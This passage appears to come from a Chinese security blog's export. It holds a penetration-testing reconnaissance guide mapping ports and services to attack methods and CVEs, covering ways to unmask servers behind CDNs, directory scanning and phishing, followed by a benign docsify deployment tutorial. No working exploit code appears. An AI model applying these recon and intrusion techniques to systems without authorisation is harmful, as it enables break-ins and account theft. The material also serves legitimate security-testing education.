href="https://dns.aizhan.com/">https://dns.aizhan.com</a></li><li>空间搜索引擎：fofa（证书、title、icon等）、shodan、钟馗之眼、傻蛋</li><li>搜索引擎：Google、百度、bing等</li><li>第三方聚合应用枚举：<a href="https://dnsdumpster.com/">https://dnsdumpster.com</a></li></ul><h2 id="常用端口信息"><a href="#常用端口信息" class="headerlink" title="常用端口信息"></a>常用端口信息</h2><ul><li>常用工具<ul><li>Nmap</li><li>御剑高速TCP端口扫描</li><li>Masscan</li><li>ZMap</li><li>Goby</li></ul></li></ul><table><thead><tr><th>端口</th><th>服务</th><th>入侵方式</th></tr></thead><tbody><tr><td>21</td><td>ftp/tftp/vsftpd文件传输协议</td><td>爆破/嗅探/溢出/后门/下载</td></tr><tr><td>22</td><td>ssh远程连接</td><td>爆破/openssh漏洞</td></tr><tr><td>23</td><td>Telnet远程连接</td><td>爆破/嗅探/弱口令</td></tr><tr><td>25</td><td>SMTP邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS域名解析系统</td><td>域传送/劫持/缓存投毒/欺骗</td></tr><tr><td>67/68</td><td>dhcp服务</td><td>劫持/欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破/嗅探</td></tr><tr><td>139</td><td>Samba服务</td><td>爆破/未授权访问/远程命令执行</td></tr><tr><td>143</td><td>Imap协议</td><td>爆破</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破/搜集目标内网信息</td></tr><tr><td>389</td><td>Ldap目录访问协议</td><td>注入/未授权访问/弱口令</td></tr><tr><td>445</td><td>smb</td><td>ms17-010/端口溢出</td></tr><tr><td>512/513/514</td><td>Linux Rexec服务</td><td>爆破/Rlogin登陆</td></tr><tr><td>873</td><td>Rsync服务</td><td>文件上传/未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破</td></tr><tr><td>1352</td><td>Lotus domino邮件服务</td><td>爆破/信息泄漏</td></tr><tr><td>1433</td><td>mssql</td><td>爆破/注入/SA弱口令</td></tr><tr><td>1521</td><td>oracle</td><td>爆破/注入/TNS爆破/反弹shell</td></tr><tr><td>2049</td><td>Nfs服务</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper服务</td><td>未授权访问</td></tr><tr><td>2375</td><td>docker remote api</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破/注入</td></tr><tr><td>3389</td><td>Rdp远程桌面链接</td><td>爆破/shift后门</td></tr><tr><td>4848</td><td>GlassFish控制台</td><td>爆破/认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2数据库</td><td>爆破/注入/提权</td></tr><tr><td>5432</td><td>postgresql</td><td>爆破/注入/缓冲区溢出</td></tr><tr><td>5632</td><td>pcanywhere服务</td><td>抓密码/代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破/认证绕过</td></tr><tr><td>6379</td><td>Redis数据库</td><td>未授权访问/爆破</td></tr><tr><td>7001/7002</td><td>weblogic</td><td>java反序列化/控制台弱口令</td></tr><tr><td>80/443</td><td>http/https</td><td>web应用漏洞/心脏滴血</td></tr><tr><td>8069</td><td>zabbix服务</td><td>远程命令执行/注入</td></tr><tr><td>8161</td><td>activemq</td><td>弱口令/写文件</td></tr><tr><td>8080/8089</td><td>Jboss/Tomcat/Resin</td><td>爆破/PUT文件上传/反序列化</td></tr><tr><td>8083/8086</td><td>influxDB</td><td>未授权访问</td></tr><tr><td>9000</td><td>fastcgi</td><td>远程命令执行</td></tr><tr><td>9090</td><td>Websphere控制台</td><td>爆破/java反序列化/弱口令</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcached</td><td>未授权访问</td></tr><tr><td>27017/27018</td><td>mongodb</td><td>未授权访问/爆破</td></tr></tbody></table><ul><li>web服务类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">tomcat--80&#x2F;8080&#x2F;8009</span><br><span class="line">           manager弱口令</span><br><span class="line">           put上传webshell</span><br><span class="line">           HTTP慢速攻击</span><br><span class="line">           ajr文件包含漏洞-CVE-2020-1938</span><br><span class="line">Jboss--8080</span><br><span class="line">           后台弱口令</span><br><span class="line">           console后台部署war包</span><br><span class="line">           JAVA反序列化</span><br><span class="line">           远程代码执行</span><br><span class="line">webSphere--9080</span><br><span class="line">               后台弱口令</span><br><span class="line">               任意文件泄露</span><br><span class="line">               JAVA反序列化</span><br><span class="line">weblogic--7001&#x2F;7002</span><br><span class="line">                   后台弱口令</span><br><span class="line">                   console后台部署war包</span><br><span class="line">                   SSRF</span><br><span class="line">                   测试页面上传webshell</span><br><span class="line">                           JAVA反序列化</span><br><span class="line">                               CVE-2018-2628</span><br><span class="line">                               CVE-2018-2893</span><br><span class="line">                               CVE-2017-10271</span><br><span class="line">                               CVE-2019-2725</span><br><span class="line">                               CVE-2019-2729</span><br><span class="line">Glassfish--8080&#x2F;4848</span><br><span class="line">                     暴力破解</span><br><span class="line">                     任意文件读取</span><br><span class="line">                     认证绕过</span><br><span class="line">Jetty--8080</span><br><span class="line">           远程共享缓冲区溢出</span><br><span class="line">Apache--80&#x2F;8080</span><br><span class="line">               HTTP慢速攻击</span><br><span class="line">               解析漏洞</span><br><span class="line">               目录遍历</span><br><span class="line">ApacheSolr--8983</span><br><span class="line">               远程命令执行</span><br><span class="line">               CVE-2017-12629</span><br><span class="line">               CVE-2019-0193</span><br><span class="line">IIS--80</span><br><span class="line">               put上传webshell</span><br><span class="line">               IIS解析漏洞</span><br><span class="line">               IIS提权</span><br><span class="line">               IIS远程远程代码执行-CVE-2017-7269</span><br><span class="line">Resin--8080</span><br><span class="line">               目录遍历</span><br><span class="line">               远程文件读取</span><br><span class="line">Axis2--8080</span><br><span class="line">           后台弱口令</span><br><span class="line">Lutos--1352</span><br><span class="line">           后台弱口令</span><br><span class="line">           信息泄露</span><br><span class="line">           跨站脚本攻击</span><br><span class="line">Nginx--80&#x2F;443</span><br><span class="line">           HTTP慢速攻击</span><br><span class="line">           解析漏洞</span><br></pre></td></tr></table></figure><ul><li>数据库类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Mysql--3306</span><br><span class="line">            弱口令</span><br><span class="line">            身份认证漏洞-cve-2012-2122</span><br><span class="line">            拒绝服务攻击</span><br><span class="line">            phpmyadmin万能密码or弱口令</span><br><span class="line">            UDF&#x2F;MOF提权</span><br><span class="line">Mssql--1433</span><br><span class="line">            弱口令</span><br><span class="line">            存储过程提权</span><br><span class="line">Oralce--1521</span><br><span class="line">            弱口令</span><br><span class="line">            TNS漏洞</span><br><span class="line">Redis--6379</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">PostgreSQL--5432</span><br><span class="line">            弱口令</span><br><span class="line">            缓冲区溢出-cve-2014-2669</span><br><span class="line">MongoDB--27001</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">DB2--5000</span><br><span class="line">            安全限制绕过进行未经授权操作-cve-2015-1922</span><br><span class="line">SysBase--5000&#x2F;4100</span><br><span class="line">            弱口令</span><br><span class="line">            命令注入</span><br><span class="line">Memcache--11211</span><br><span class="line">            未经授权访问</span><br><span class="line">            配置漏洞</span><br><span class="line">ElasticSearch--9200&#x2F;9300</span><br><span class="line">            未经授权访问</span><br><span class="line">            远程代码执行</span><br><span class="line">            文件办理</span><br><span class="line">            写入webshell</span><br></pre></td></tr></table></figure><ul><li>大数据类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hadoop--50010</span><br><span class="line">              远程命令执行</span><br><span class="line">Zookeeper--2181</span><br><span class="line">              未经授权访问</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>文件共享</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Ftp--21</span><br><span class="line">        弱口令</span><br><span class="line">        匿名访问</span><br><span class="line">        上传后门</span><br><span class="line">        远程溢出</span><br><span class="line">        跳转攻击</span><br><span class="line">NFS--2049</span><br><span class="line">        未经授权访问</span><br><span class="line">Samba--137</span><br><span class="line">        弱口令</span><br><span class="line">        未经授权访问</span><br><span class="line">        远程代码执行-CVE-2015-0240</span><br><span class="line">LDAP--389</span><br><span class="line">        弱口令</span><br><span class="line">        注入</span><br><span class="line">        未经授权访问</span><br></pre></td></tr></table></figure><ul><li>远程访问</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SSH--22</span><br><span class="line">            弱口令</span><br><span class="line">            28退格漏洞</span><br><span class="line">            OpenSSL漏洞</span><br><span class="line">            用户名枚举</span><br><span class="line">Telent--23</span><br><span class="line">            弱口令</span><br><span class="line">RDP--3389</span><br><span class="line">            弱口令</span><br><span class="line">            Shitf粘滞键后门</span><br><span class="line">            缓冲区溢出</span><br><span class="line">            MS12-020</span><br><span class="line">            CVE-2019-0708</span><br><span class="line">VNC--5901</span><br><span class="line">            弱口令</span><br><span class="line">            认证口令绕过</span><br><span class="line">            拒绝服务攻击-CVE-2015-5239</span><br><span class="line">            权限提升-CVE-2013-6886</span><br><span class="line">Pcanywhere--5632</span><br><span class="line">            拒绝服务攻击</span><br><span class="line">            权限提升</span><br><span class="line">            代码执行</span><br><span class="line">X11--6000</span><br><span class="line">            未经授权访问-CVE-1999-0526</span><br></pre></td></tr></table></figure><ul><li>邮件服务</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SMTP--25&#x2F;465</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">            邮件伪造</span><br><span class="line">POP3--110&#x2F;995</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">IMAP--143&#x2F;993</span><br><span class="line">            弱口令</span><br><span class="line">            任意文件读取</span><br></pre></td></tr></table></figure><ul><li>其他服务</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DNS--53</span><br><span class="line">            DNS区域传输</span><br><span class="line">            DNS劫持</span><br><span class="line">            DNS欺骗</span><br><span class="line">            DNS缓存投毒</span><br><span class="line">            DNS隧道</span><br><span class="line">DHCP--67&#x2F;68</span><br><span class="line">            DHCP劫持</span><br><span class="line">            DHCP欺骗</span><br><span class="line">SNMP--161</span><br><span class="line">            弱口令</span><br><span class="line">Rlogin--512&#x2F;513&#x2F;514</span><br><span class="line">            rlogin登录</span><br><span class="line">Rsync--873</span><br><span class="line">            未经授权访问</span><br><span class="line">            本地权限提升</span><br><span class="line">Zabbix--8069</span><br><span class="line">            远程命令执行</span><br><span class="line">RMI--1090&#x2F;1099</span><br><span class="line">            JAVA反序列化</span><br><span class="line">Docker--2375</span><br><span class="line">            未经授权访问</span><br></pre></td></tr></table></figure><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。对目标渗透测试过程中，目标的cms是十分重要的信息，有了目标的cms，就可以利用相关bug进行测试，进行代码审计等。</p><ul><li>在指纹识别的学习过程中，有很多开源的工具和指纹库，如fofa、WhatWeb、w11scan、WebEye、御剑Web指纹识别、WebRobo、椰树、轻量web指纹识别</li><li>在线网站查询：<ul><li>BugScaner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></li><li>云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></li><li>WhatWeb：<a href="https://whatweb.net/">https://whatweb.net</a></li><li>Wapplyzer插件</li></ul></li><li>识别方式</li></ul><table><thead><tr><th>识别方式</th></tr></thead><tbody><tr><td>网站特有文件：如/templets/default/style/dedecms.css—dedecms</td></tr><tr><td>网站独有文件的md5：如favicon.ico，但是该文件可以被修改导致不准确。</td></tr><tr><td>网站文件命名规则</td></tr><tr><td>返回头的关键字</td></tr><tr><td>网页关键字：如/data/sessions/index.html——dedecms</td></tr><tr><td>Url特征</td></tr><tr><td>Meta特征</td></tr><tr><td>Script特征</td></tr><tr><td>robots.txt</td></tr><tr><td>网站路径特征</td></tr><tr><td>网站静态资源</td></tr><tr><td>爬虫网站目录信息</td></tr></tbody></table><h2 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h2><p>对应给定的目标，例如一个网站，首先获得的是目标域名，下一步就是找到域名背后的服务器ip，由于当前网站大多使用CDN（内容分发网络）对网站访问流量进行分流和一定程度的攻击防护，所以找出CDN背后的服务器真实ip就是一种“刚需”了。</p><ul><li>验证是否有CDN<ul><li>ping和nslookup（解析对应多个 IP 地址）</li><li>多地 ping 服务（IP 地址不唯一）：<ul><li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></li><li><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></li><li><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></li></ul></li></ul></li><li>绕过 CDN 查找网站真实 IP<ul><li>查询历史DNS记录<ul><li>1、查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<ul><li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> ###DNS查询</li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> ###微步在线</li><li><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a> ###在线域名信息查询</li><li><a href="http://viewdns.info/">http://viewdns.info/</a> ###DNS、IP等查询</li><li><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> ###CDN查询IP</li></ul></li><li>2、利用SecurityTrails（<a href="https://securitytrails.com/">https://securitytrails.com/</a> ） 平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</li></ul></li><li>查询子域名：毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。常用查找子域名方法有：微步在线(<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> )、 Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> )、 Google 搜索（Google site:baidu.com -www就能查看除www外的子域名）、各种子域名扫描器。</li><li>搜索引擎：常见的有以前的钟馗之眼，shodan，fofa搜索。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。</li><li>利用SSL证书寻找真实原始IP：对于目标网站的SSL证书，要查找其使用的IPv4主机，只需将”SHA1 fingerprint”（签名证书的sha1值）粘贴到Censys IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器。</li><li>利用HTTP标头寻找真实原始IP：借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</li><li>利用网站返回的内容寻找真实原始IP：如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</li><li>使用国外主机解析域名。</li><li>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</li><li>网站漏洞查找：<ul><li>1、目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</li><li>2、XSS盲打，命令执行反弹shell，SSRF等。</li><li>3、无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</li></ul></li><li>网站邮件订阅查找：RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</li><li>用 Zmap 扫全网：需要找 xiaix.me 网站的真实 IP，我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me。</li><li>F5 LTM解码法：当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</li></ul></li></ul><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>网站目录和敏感文件扫描是网站测试中最基本的手段之一。如果通过该方法发现了网站后台，可以尝试暴库、SQL注入等方式进行安全测试；如果发现敏感目录或敏感文件，能帮我们获取如php环境变量、robots.txt、网站指纹等信息；如果扫描出了一些上传的文件，我们甚至可能通过上传功能（一句话恶意代码）获取网站的权限。</p><ul><li>目录扫描原理：通过请求返回的信息来判断当前目录或文件是否真实存在。网站后台扫描工具都是利用目录字典进行爆破扫描，字典越多，扫描到的结果也越多。</li><li>工具：<ul><li>dirsearch：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li><li>yjdirscan（御剑目录扫描专业版）：<a href="https://github.com/foryujian/yjdirscan">https://github.com/foryujian/yjdirscan</a></li><li>7kbscan-WebPathBrute：<a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></li><li>Dirmap：<a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></li><li>DirBuster：Kali Linux提供的目录扫描工具</li><li>webdirscan：<a href="https://github.com/TuuuNya/webdirscan">https://github.com/TuuuNya/webdirscan</a></li></ul></li></ul><h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><ul><li>社工库</li><li>邮件钓鱼</li><li>客服</li><li>构造字典</li><li>…..</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docsify部署知识库</title>
      <link href="2020/10/23/docsify%E9%83%A8%E7%BD%B2%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
      <url>2020/10/23/docsify%E9%83%A8%E7%BD%B2%E7%9F%A5%E8%AF%86%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ul><li>nodejs&nbsp;&nbsp;&nbsp;</li><li>Ubuntu 16.04</li><li>docsify</li><li>Nginx</li></ul><h2 id="0x02-搭建nodejs"><a href="#0x02-搭建nodejs" class="headerlink" title="0x02 搭建nodejs"></a>0x02 搭建nodejs</h2><ul><li>安装nodejs</li><li><a href="https://npm.taobao.org/mirrors/node/v10.15.0/">https://npm.taobao.org/mirrors/node/v10.15.0/</a> ,下载对应版本的nodejs（这里下载10.15）<br><img src="/images/pasted-4.png" alt="upload successful"></li></ul><ul><li>解压：tar -zxvf node-v10.15.0-linux-x64.tar.gz</li><li>修改名字：mv node-v10.15.0-linux-x64 nodejs</li><li>移动到/usr/local目录下（这个自己能找到就行）：mv nodejs /usr/local</li><li>建立全局软连:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;bin&#x2F;node &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node</span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;bin&#x2F;npm &#x2F;usr&#x2F;local&#x2F;bin&#x2F;npm</span><br></pre></td></tr></table></figure><img src="/images/pasted-5.png" alt="upload successful"></li></ul><h2 id="0x03-安装docsify"><a href="#0x03-安装docsify" class="headerlink" title="0x03 安装docsify"></a>0x03 安装docsify</h2><ul><li><p>npm全局安装：npm i docsify-cli -g</p></li><li><p>若安装完执行docsify找不到命令，那就建立一个软连接:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;bin&#x2F;docsify &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docsify</span><br></pre></td></tr></table></figure></li><li><p>docsify命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始化：docsify init .&#x2F;docs</span><br><span class="line">本地预览：docsify serve docs</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-6.png" alt="upload successful"><br><img src="/images/pasted-7.png" alt="upload successful"></p></li><li><p>更多详情请参考官方文档：<a href="https://docsify.js.org/#/zh-cn/quickstart">https://docsify.js.org/#/zh-cn/quickstart</a></p></li></ul><h2 id="0x04-配置访问权限"><a href="#0x04-配置访问权限" class="headerlink" title="0x04 配置访问权限"></a>0x04 配置访问权限</h2><ul><li><p>Nginx配置反向代理和Basic Authentication 401认证</p><ul><li><p>编辑nginx的配置文件/etc/nginx/nginx.conf如下：<br><img src="/images/pasted-8.png" alt="upload successful"></p></li><li><p>生成密码文件&nbsp;sudo htpasswd -c /etc/nginx/conf/htpasswd username&nbsp;根据提示输入密码&nbsp;</p></li></ul></li><li><p>重新加载nginx：&nbsp;sudo service nginx reload</p></li><li><p>  再次登录，提示弹出框，输入用户名和密码<br><img src="/images/pasted-9.png" alt="upload successful"></p></li></ul><h2 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h2><ul><li><p>pandoc批量将docx文件转markdown文件</p><ul><li>官方链接：<a href="https://www.pandoc.org/">https://www.pandoc.org</a>，pandoc是文档格式转化工具，能够多种文档格式转换。</li><li>  命令格式：pandoc -o f.md f.docx -extract-media=f</li><li>批量递归替换文件名和文件夹名中的空格或者特殊字符：<br><img src="/images/pasted-10.png" alt="upload successful"><br>批量替换空格或者其他特殊字符<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line">chcp 65001</span><br><span class="line"></span><br><span class="line">:: 如果要指定绝对路径，用以下两行，注释 set path&#x3D;. 所在行。也就是用以下两行代替 set path&#x3D;. 这一行。</span><br><span class="line">:: set path&#x3D;&quot;C:\temp\test&quot;</span><br><span class="line">:: cd &quot;&#x2F;d %path%&quot;</span><br><span class="line"></span><br><span class="line">set path&#x3D;.</span><br><span class="line">:: echo.&amp;set &#x2F;p path&#x3D;please input path:</span><br><span class="line"></span><br><span class="line">set str_space&#x3D; </span><br><span class="line">set str_heng&#x3D;-</span><br><span class="line"></span><br><span class="line">:: 删除特殊字符，记得替换成你自己需要删除的</span><br><span class="line">set adv&#x3D; </span><br><span class="line">:: echo.&amp;set &#x2F;p adv&#x3D;please input to be delete characters:</span><br><span class="line"></span><br><span class="line">call:renameFiles</span><br><span class="line"></span><br><span class="line">for &#x2F;f &quot;delims&#x3D;&quot; %%i in (&#39;dir &#x2F;ad&#x2F;b&#x2F;s &quot;%path%&quot;&#39;) do (</span><br><span class="line">       cd %%i</span><br><span class="line">       call:renameFiles</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line">echo 处理完毕</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line">:: 子过程一般放在最后，主程序最后要加上exit或跳转语句，避免错误的进入子过程。</span><br><span class="line">:: 如果没有 exit，子程序还会被执行（而不是调用）一次，这样在执行 echo %1 时，因为没有参数，会提示：ECHO is off.</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">:renameFiles</span><br><span class="line">echo 正在处理的目录：【%cd%】 ...</span><br><span class="line"></span><br><span class="line">:: 先删除空格</span><br><span class="line">for &#x2F;f &quot;delims&#x3D;&quot; %%i in (&#39;dir &#x2F;b *.*&#39;) do (</span><br><span class="line">    set &quot;foo&#x3D;%%i&quot;</span><br><span class="line">    ren &quot;%%~i&quot; &quot;!foo:%str_space%&#x3D;%str_heng%!&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">for &#x2F;f &quot;delims&#x3D;&quot; %%i in (&#39;dir &#x2F;b *%adv%*&#39;) do (</span><br><span class="line">    :: echo %%i</span><br><span class="line">    set 